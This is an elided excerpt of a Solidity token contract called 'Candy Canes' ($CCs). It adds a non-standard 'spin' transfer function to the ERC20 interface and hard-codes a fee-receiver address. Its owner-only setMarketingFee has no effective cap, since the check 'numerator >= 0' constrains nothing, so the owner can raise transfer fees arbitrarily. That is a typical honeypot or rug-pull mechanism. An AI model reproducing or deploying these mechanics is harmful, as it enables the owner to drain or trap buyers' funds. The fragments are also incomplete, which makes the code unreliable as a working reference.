...
interface IERC20 {
    ...
    function spin(address sender, address recipient, uint256 amount) external returns (bool);
...
contract CandyCanes is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "Candy Canes";
    string constant _symbol = "$CCs";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals); 
    uint256 public _maxTxAmount = (_totalSupply * 1000) / 1000; 
    uint256 public _maxWalletSize = (_totalSupply *  200)/ 1000; 
    ...
    constructor () {
        ...
        marketingFeeReceiver = address(0x16F90a2c3d79017041d31685791dCf703453edD5);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        return _transferFromm(sender, recipient, amount);
    }

    function spin(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
    ...
    function _transferFromm(address sender , address recipient , uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
    ...
    function setMarketingFee(uint256 numerator) external onlyOwner() {
        require(numerator >= 0);
        marketingFee = numerator;
        totalFee = numerator;
    }
